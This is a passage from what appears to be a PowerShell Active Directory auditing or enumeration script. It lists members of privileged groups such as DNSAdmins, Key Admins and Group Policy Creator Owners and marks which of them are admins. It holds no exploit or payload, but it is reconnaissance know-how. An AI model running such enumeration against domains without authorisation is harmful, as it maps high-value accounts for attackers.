				$domainObject = Get-DomainObject -Identity $CertPublisher.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($CertPublisher.MemberName) { $CertPublisher.MemberName } else { $convertedMemberName }
				$isEnabled = if ($CertPublisher.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $CertPublisher.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $CertPublisher.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $CertPublisher.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $CertPublisher.MemberSID
					"Group Domain" = $CertPublisher.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempCertPublishersGroup = foreach ($AllDomain in $AllDomains) {
				$CertPublishers = Get-DomainGroupMember -Domain $AllDomain -Identity "Cert Publishers" -Recurse
				foreach($CertPublisher in $CertPublishers){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $CertPublisher.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $CertPublisher.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $CertPublisher.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($CertPublisher.MemberName) { $CertPublisher.MemberName } else { $convertedMemberName }
					$isEnabled = if ($CertPublisher.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $CertPublisher.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $CertPublisher.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $CertPublisher.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $CertPublisher.MemberSID
						"Group Domain" = $CertPublisher.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempCertPublishersGroup) {
			$TempCertPublishersGroup | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLCertPublishersGroup = $TempCertPublishersGroup | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Cert Publishers</h2>"
		}
		
		#################################################### 
		########### DNS Admins ################
		####################################################
		
		Write-Host ""
		Write-Host "DNS Admins:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$DNSAdmins = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "DNSAdmins" -Recurse
			$TempDNSAdmins = foreach($DNSAdmin in $DNSAdmins){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $DNSAdmin.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $DNSAdmin.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $DNSAdmin.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($DNSAdmin.MemberName) { $DNSAdmin.MemberName } else { $convertedMemberName }
				$isEnabled = if ($DNSAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $DNSAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $DNSAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $DNSAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $DNSAdmin.MemberSID
					"Group Domain" = $DNSAdmin.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempDNSAdmins = foreach ($AllDomain in $AllDomains) {
				$DNSAdmins = Get-DomainGroupMember -Domain $AllDomain -Identity "DNSAdmins" -Recurse
				foreach($DNSAdmin in $DNSAdmins){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $DNSAdmin.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $DNSAdmin.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $DNSAdmin.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($DNSAdmin.MemberName) { $DNSAdmin.MemberName } else { $convertedMemberName }
					$isEnabled = if ($DNSAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $DNSAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $DNSAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $DNSAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $DNSAdmin.MemberSID
						"Group Domain" = $DNSAdmin.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempDNSAdmins) {
			$TempDNSAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLDNSAdmins = $TempDNSAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>DNS Admins</h2>"
		}
		
		#################################################### 
		########### Enterprise Key Admins ################
		####################################################
		
		Write-Host ""
		Write-Host "Enterprise Key Admins:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$EnterpriseKeyAdmins = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Enterprise Key Admins" -Recurse
			$TempEnterpriseKeyAdmins = foreach($EnterpriseKeyAdmin in $EnterpriseKeyAdmins){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $EnterpriseKeyAdmin.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $EnterpriseKeyAdmin.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $EnterpriseKeyAdmin.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($EnterpriseKeyAdmin.MemberName) { $EnterpriseKeyAdmin.MemberName } else { $convertedMemberName }
				$isEnabled = if ($EnterpriseKeyAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EnterpriseKeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EnterpriseKeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EnterpriseKeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $EnterpriseKeyAdmin.MemberSID
					"Group Domain" = $EnterpriseKeyAdmin.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempEnterpriseKeyAdmins = foreach ($AllDomain in $AllDomains) {
				$EnterpriseKeyAdmins = Get-DomainGroupMember -Domain $AllDomain -Identity "Enterprise Key Admins" -Recurse
				foreach($EnterpriseKeyAdmin in $EnterpriseKeyAdmins){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $EnterpriseKeyAdmin.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $EnterpriseKeyAdmin.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $EnterpriseKeyAdmin.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($EnterpriseKeyAdmin.MemberName) { $EnterpriseKeyAdmin.MemberName } else { $convertedMemberName }
					$isEnabled = if ($EnterpriseKeyAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EnterpriseKeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EnterpriseKeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EnterpriseKeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $EnterpriseKeyAdmin.MemberSID
						"Group Domain" = $EnterpriseKeyAdmin.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempEnterpriseKeyAdmins) {
			$TempEnterpriseKeyAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLEnterpriseKeyAdmins = $TempEnterpriseKeyAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Enterprise Key Admins</h2>"
		}
		
		#################################################### 
		########### Enterprise Read-Only Domain Controllers ################
		####################################################
		
		Write-Host ""
		Write-Host "Enterprise Read-Only Domain Controllers:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$EnterpriseRODCs = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Enterprise Read-Only Domain Controllers" -Recurse
			$TempEnterpriseRODCs = foreach($EnterpriseRODC in $EnterpriseRODCs){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $EnterpriseRODC.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $EnterpriseRODC.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $EnterpriseRODC.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($EnterpriseRODC.MemberName) { $EnterpriseRODC.MemberName } else { $convertedMemberName }
				$isEnabled = if ($EnterpriseRODC.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EnterpriseRODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EnterpriseRODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EnterpriseRODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $EnterpriseRODC.MemberSID
					"Group Domain" = $EnterpriseRODC.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempEnterpriseRODCs = foreach ($AllDomain in $AllDomains) {
				$EnterpriseRODCs = Get-DomainGroupMember -Domain $AllDomain -Identity "Enterprise Read-Only Domain Controllers" -Recurse
				foreach($EnterpriseRODC in $EnterpriseRODCs){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $EnterpriseRODC.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $EnterpriseRODC.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $EnterpriseRODC.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($EnterpriseRODC.MemberName) { $EnterpriseRODC.MemberName } else { $convertedMemberName }
					$isEnabled = if ($EnterpriseRODC.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EnterpriseRODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EnterpriseRODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EnterpriseRODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $EnterpriseRODC.MemberSID
						"Group Domain" = $EnterpriseRODC.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempEnterpriseRODCs) {
			$TempEnterpriseRODCs | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLEnterpriseRODCs = $TempEnterpriseRODCs | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Enterprise Read-Only Domain Controllers</h2>"
		}

		
		#################################################### 
		########### Group Policy Creator Owners ################
		####################################################
		
		Write-Host ""
		Write-Host "Group Policy Creator Owners:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$GPCreatorOwners = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Group Policy Creator Owners" -Recurse
			$TempGPCreatorOwners = foreach($GPCreatorOwner in $GPCreatorOwners){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $GPCreatorOwner.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $GPCreatorOwner.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $GPCreatorOwner.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($GPCreatorOwner.MemberName) { $GPCreatorOwner.MemberName } else { $convertedMemberName }
				$isEnabled = if ($GPCreatorOwner.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $GPCreatorOwner.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $GPCreatorOwner.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $GPCreatorOwner.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $GPCreatorOwner.MemberSID
					"Group Domain" = $GPCreatorOwner.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempGPCreatorOwners = foreach ($AllDomain in $AllDomains) {
				$GPCreatorOwners = Get-DomainGroupMember -Domain $AllDomain -Identity "Group Policy Creator Owners" -Recurse
				foreach($GPCreatorOwner in $GPCreatorOwners){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $GPCreatorOwner.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $GPCreatorOwner.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $GPCreatorOwner.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($GPCreatorOwner.MemberName) { $GPCreatorOwner.MemberName } else { $convertedMemberName }
					$isEnabled = if ($GPCreatorOwner.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $GPCreatorOwner.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $GPCreatorOwner.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $GPCreatorOwner.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $GPCreatorOwner.MemberSID
						"Group Domain" = $GPCreatorOwner.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempGPCreatorOwners) {
			$TempGPCreatorOwners | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLGPCreatorOwners = $TempGPCreatorOwners | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Group Policy Creator Owners</h2>"
		}

		#################################################### 
		########### Key Admins ################
		####################################################
		
		Write-Host ""
		Write-Host "Key Admins:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$KeyAdmins = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Key Admins" -Recurse
			$TempKeyAdmins = foreach($KeyAdmin in $KeyAdmins){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $KeyAdmin.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $KeyAdmin.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $KeyAdmin.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($KeyAdmin.MemberName) { $KeyAdmin.MemberName } else { $convertedMemberName }
				$isEnabled = if ($KeyAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $KeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $KeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $KeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $KeyAdmin.MemberSID
					"Group Domain" = $KeyAdmin.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempKeyAdmins = foreach ($AllDomain in $AllDomains) {
				$KeyAdmins = Get-DomainGroupMember -Domain $AllDomain -Identity "Key Admins" -Recurse
				foreach($KeyAdmin in $KeyAdmins){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $KeyAdmin.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $KeyAdmin.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $KeyAdmin.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($KeyAdmin.MemberName) { $KeyAdmin.MemberName } else { $convertedMemberName }
					$isEnabled = if ($KeyAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $KeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $KeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $KeyAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $KeyAdmin.MemberSID
						"Group Domain" = $KeyAdmin.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempKeyAdmins) {
			$TempKeyAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLKeyAdmins = $TempKeyAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Key Admins</h2>"
		}
		
		#################################################### 
		########### Protected Users ################
		####################################################
		
		Write-Host ""
		Write-Host "Protected Users:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ProtectedUsers = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Protected Users" -Recurse
			$TempProtectedUsers = foreach($ProtectedUser in $ProtectedUsers){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
